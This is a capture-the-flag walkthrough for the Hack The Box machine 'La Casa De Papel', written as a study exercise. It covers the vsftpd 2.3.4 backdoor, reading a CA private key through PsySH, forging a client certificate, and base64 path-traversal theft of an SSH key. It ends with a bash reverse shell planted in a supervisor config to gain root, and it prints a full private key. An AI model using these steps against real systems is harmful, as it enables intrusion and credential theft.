# LA CASA DE PAPEL

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ nmap 10.10.10.131                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 07:11 EDT
Nmap scan report for 10.10.10.131
Host is up (0.34s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 122.06 seconds
                                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ nmap 10.10.10.131 -p 21,22,80,443 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 07:14 EDT
Nmap scan report for 10.10.10.131
Host is up (0.29s latency).

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
Service Info: OS: Unix
```


## PORT 21

Using searchsploit to look for a exploit.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ searchsploit vsftpd 2.3.4
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                               | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                  | unix/remote/17491.rb
------------------------------------------------------------------------ ---------------------------------
```

First I tried to use metasploit but it did not work so I used the python script. Running the exploit gave us a shell in psy.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ ./49757.py 10.10.10.131
Success, shell opened
Send `exit` to quit shell
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
ls
Variables: $tokyo
show $tokyo
  > 2| class Tokyo {
    3|  private function sign($caCert,$userCsr) {
    4|          $caKey = file_get_contents('/home/nairobi/ca.key');
    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6|          openssl_x509_export($userCert, $userCertOut);
    7|          return $userCertOut;
    8|  }
    9| }

exec(whoami)
PHP Fatal error:  Call to undefined function exec() in Psy Shell code on line 1
```

We find a variable which gives us some info like a username `nairobi` who owns a file `ca.key`. But on trying get command execution gives us error.
I tried to use some more php functions to get command execution but they all gave the same error.
On using `phpinfo()` I found that some function are disabled so we cannot use them.

```bash
disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
``` 

I googled some more and found the functions which we can use to read files. So I used `scandir()` function to list files in a directory and `file_get_contents()` function to read files. 

```bash
scandir('/home/nairobi')
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
file_get_contents('/home/nairobi/ca.key')
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """
```

## SSH

![](https://github.com/Leo-2807/Writeups/blob/main/images/la1.png)

We need a client certificate to access this site. We just found a private key file on ftp port . On searching how to create a client certificate I found [this document](https://www.firehousesoftware.com/webhelp/FHWeb/Content/FHWebAdministratorsGuide/63_CreatingCAKeyAndCertificate.htm).

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ openssl genrsa -out client.key 4096   
Generating RSA private key, 4096 bit long modulus (2 primes)
.............................++++
..............................................++++
e is 65537 (0x010001)
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ openssl req  -new  -key client.key -out client.csr                                                1 ⨯
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:La Casa De Papel
Organizational Unit Name (eg, section) []:lacasadepapel.htb
Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
                                                                                     
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ openssl x509 -req  -days 1825 -signkey ca.key -in client.csr -out client.pem                      1 ⨯
Signature ok
subject=C = AU, ST = Some-State, O = La Casa De Papel, OU = lacasadepapel.htb, CN = lacasadepapel.htb
Getting Private key
                                                                                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12                               1 ⨯
Enter Export Password:
Verifying - Enter Export Password:

```

After uploading the certificate on firefox and reloading the site, the site shows some new information.

![](https://github.com/Leo-2807/Writeups/blob/main/images/la2.png)

## SHELL

Clicking on `season 1` gives a list of episodes to download. But also the url suggests a `lfi` vulnerability.

![](https://github.com/Leo-2807/Writeups/blob/main/images/la3.png)

We can list the files in a directory but cannot read them.
But url for downloading the episode have the path of the episode base64 encoded. We can use this vulnerability to download the rsa private key.

![](https://github.com/Leo-2807/Writeups/blob/main/images/la4.png)

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ echo 'U0VBU09OLTEvMDEuYXZp' | base64 -d
SEASON-1/01.avi 
```

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ echo -n '../../../../home/berlin/.ssh/id_rsa' | base64 
Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E=             
```

![](https://github.com/Leo-2807/Writeups/blob/main/images/la5.png)

I also downloaded the `user.txt` file the same way.

I tried to ssh into the machine using the key but couldn't. So I tried other users and was able to successfully ssh as professor.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ ssh -i id_rsa professor@10.10.10.131

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ whoami
professor
```

## PRIVESEC

```bash
lacasadepapel [~]$ ls
linpeas.sh     memcached.ini  memcached.js   node_modules
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

I used `ps aux` command to check if this program is being executed.

```bash
10508 nobody    0:13 /usr/bin/node /home/professor/memcached.js
```

We cannot edit the file `memcached.js` but we can delete it and make a new file.

```bash
lacasadepapel [~]$ rm memcached.ini
rm: remove 'memcached.ini'? yes
lacasadepapel [~]$ vi memcached.ini

lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = bash -c 'bash -i >& /dev/tcp/10.10.14.2/9999 0
>&1'
```

A few seconds later We get a reverse shell as root.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lacasadepapel]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.131] 40423
whoami
root
python -c 'import pty; pty.spawn("/bin/bash")'

bash-4.4# ls
ls
root.txt
bash-4.4#
```

